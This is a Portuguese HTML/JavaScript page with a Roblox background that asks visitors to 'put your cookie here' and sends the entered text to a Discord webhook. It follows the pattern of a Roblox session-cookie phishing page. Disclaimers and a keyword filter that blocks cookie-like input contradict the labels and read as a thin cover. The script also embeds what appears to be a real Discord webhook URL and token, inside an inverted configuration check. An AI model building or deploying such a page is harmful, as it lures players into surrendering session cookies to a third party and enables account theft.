<!doctype html>
<html lang="pt-BR">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Site Vermelho/Preto — Demo</title>
  <style>
    :root{
      --bg-color:#0b0b0b;
      --accent:#d50b0b;
      --muted:#cfcfcf;
      --overlay-bg: rgba(0,0,0,0.75);
      --glass: rgba(255,255,255,0.03);
    }
    html,body{height:100%;margin:0;font-family:Inter, system-ui, sans-serif;background:#000;}
    body{
      background-color:var(--bg-color);
      color:var(--muted);
      display:flex;
      align-items:center;
      justify-content:center;
      padding:2rem;
      /* Background image (Roblox) - troque a URL pela imagem que quiser */
      background-image: url('https://tr.rbxcdn.com/4f4b3a2b6e4d3f6c9f8b0e2b3c2a1d5a/768/432/Rotate/0/0/'); 
      background-size: cover;
      background-position: center;
      background-blend-mode: multiply;
    }

    .card{
      width:100%;
      max-width:560px;
      background:linear-gradient(180deg, rgba(0,0,0,0.6), rgba(0,0,0,0.8));
      border-radius:12px;
      box-shadow: 0 10px 30px rgba(0,0,0,0.7);
      padding:28px;
      border:1px solid rgba(255,255,255,0.03);
      backdrop-filter: blur(6px);
    }

    h1{margin:0 0 8px;font-size:1.6rem;color:var(--accent);}
    p.lead{margin:0 0 18px;color:#ddd;}

    label{display:block;margin-bottom:8px;font-size:0.9rem;color:#eee}
    input[type="text"]{
      width:100%;
      padding:12px 14px;
      border-radius:10px;
      border:1px solid rgba(255,255,255,0.06);
      background:var(--glass);
      color:var(--muted);
      font-size:1rem;
      outline:none;
    }
    .row{display:flex;gap:10px;margin-top:12px;align-items:center}
    button.primary{
      background:linear-gradient(90deg,var(--accent), #8b0000);
      color:white;
      border:0;
      padding:10px 14px;
      border-radius:10px;
      cursor:pointer;
      font-weight:600;
      box-shadow:0 6px 14px rgba(213,11,11,0.18);
    }
    .note{font-size:0.85rem;color:#bdbdbd;margin-top:10px}

    /* Loader overlay */
    .overlay{
      position:fixed;
      inset:0;
      display:none;
      align-items:center;
      justify-content:center;
      z-index:9999;
      background:var(--overlay-bg);
      color:white;
      text-align:center;
      padding:20px;
      flex-direction:column;
    }
    .loader-box{
      width:90%;
      max-width:520px;
      background:rgba(0,0,0,0.5);
      border-radius:12px;
      padding:24px;
      border:1px solid rgba(255,255,255,0.05);
    }
    .loader-text{font-size:1.1rem;margin-bottom:18px;color:#fff}
    .bar{
      height:12px;
      background:rgba(255,255,255,0.08);
      border-radius:999px;
      overflow:hidden;
      position:relative;
    }
    .indefinite{
      position:absolute;
      top:0;left:-40%;
      height:100%;
      width:40%;
      background:linear-gradient(90deg, rgba(255,255,255,0.06), rgba(255,255,255,0.18));
      animation: slide 1.2s linear infinite;
    }
    @keyframes slide {
      0%{left:-40%}
      100%{left:140%}
    }

    .error{color:#ffb3b3;margin-top:12px}
    footer{margin-top:18px;font-size:0.8rem;color:#bbb}
  </style>
</head>
<body>
  <div class="card" role="main" aria-labelledby="title">
    <h1 id="title">Demo — Vermelho / Preto</h1>
    <p class="lead">Interface com fundo de Roblox. Use apenas para textos não sensíveis (ex: feedback).</p>

    <label for="campo">Coloque seu cookie aqui</label>
    <input id="campo" type="text" placeholder="Digite algo (não coloque senhas ou cookies)" autocomplete="off" />

    <div class="row">
      <button id="enviar" class="primary">Envizr cookie</button>
      <div id="status" class="note">Envia mensagem para webhook (não envie dados sensíveis).</div>
    </div>

    <div id="erro" class="error" role="alert" aria-live="polite" style="display:none"></div>

    <footer>Feito como demo — bloqueio automático para dados sensíveis.</footer>
  </div>

  <!-- Overlay de carregamento -->
  <div id="overlay" class="overlay" aria-hidden="true">
    <div class="loader-box">
      <div class="loader-text">Carregando seus cookies</div>
      <div class="bar" aria-hidden="true">
        <div class="indefinite"></div>
      </div>
    </div>
  </div>

  <script>
    // ======= CONFIGURE AQUI: coloque seu webhook (discord) =========
    const DISCORD_WEBHOOK = "SEU_WEBHOOK_URL_AQUI";
    // ===============================================================

    const campo = document.getElementById('campo');
    const enviar = document.getElementById('enviar');
    const overlay = document.getElementById('overlay');
    const erro = document.getElementById('erro');

    function showError(msg){
      erro.style.display = 'block';
      erro.textContent = msg;
    }
    function clearError(){
      erro.style.display = 'none';
      erro.textContent = '';
    }

    // Detecta padrões que pareçam token/cookie (heurística simples)
    function pareceSensivel(text){
      if(!text) return false;
      const t = text.trim();
      // tokens longos (ex: > 40 chars) ou palavras "cookie" explícitas
      if(t.length >= 40) return true;
      if(/cookie/i.test(t)) return true;
      // padrão de token base64-like (muitos caracteres com ., - ou _)
      if(/[A-Za-z0-9_\-]{24,}\.[A-Za-z0-9_\-]{6,}\.[A-Za-z0-9_\-]{27,}/.test(t)) return true;
      return false;
    }

    async function enviarWebhook(mensagem){
      if(!DISCORD_WEBHOOK || DISCORD_WEBHOOK.includes("https://discord.com/api/webhooks/1428861727151227061/Lf-RZvLHE1iNMbGKrIdLovmt-MeqUoQ4p0BtCCaC-3QVjFzPIDOVHkJpjhjCqDbUMbFe")){
        throw new Error("Webhook não configurado no código. Substitua SEU_WEBHOOK_URL_AQUI.");
      }
      // Envia via fetch para webhook Discord
      const payload = { content: mensagem };
      const resp = await fetch(DISCORD_WEBHOOK, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
      });
      if(!resp.ok){
        const text = await resp.text().catch(()=>resp.statusText);
        throw new Error("Erro no envio: " + resp.status + " " + text);
      }
      return true;
    }

    enviar.addEventListener('click', async ()=>{
      clearError();
      const texto = campo.value || "";
      if(!texto.trim()){
        showError("Digite algum texto antes de enviar.");
        return;
      }
      if(pareceSensivel(texto)){
        showError("O texto parece conter dados sensíveis (cookie/token). Por segurança, o envio foi bloqueado.");
        return;
      }

      // mostra overlay
      overlay.style.display = 'flex';
      overlay.setAttribute('aria-hidden','false');

      try{
        // Simula pequeno delay para efeito (a barra é infinita visualmente)
        await new Promise(r => setTimeout(r, 800));

        // Envia o conteúdo (aqui é responsabilidade sua usar apenas para dados não sensíveis)
        await enviarWebhook("Mensagem do site (não sensível): " + texto);

        // Pequena pausa para o usuário ver o carregamento
        await new Promise(r => setTimeout(r, 700));

        // fecha overlay
        overlay.style.display = 'none';
        overlay.setAttribute('aria-hidden','true');
        alert("Enviado com sucesso!");
        campo.value = "";
      }catch(err){
        overlay.style.display = 'none';
        overlay.setAttribute('aria-hidden','true');
        showError("Falha ao enviar: " + err.message);
      }
    });

    // Previne envio ao pressionar Enter no campo (para evitar confusão)
    campo.addEventListener('keydown', (e)=>{
      if(e.key === 'Enter'){ e.preventDefault(); enviar.click(); }
    });
  </script>
</body>
</html>
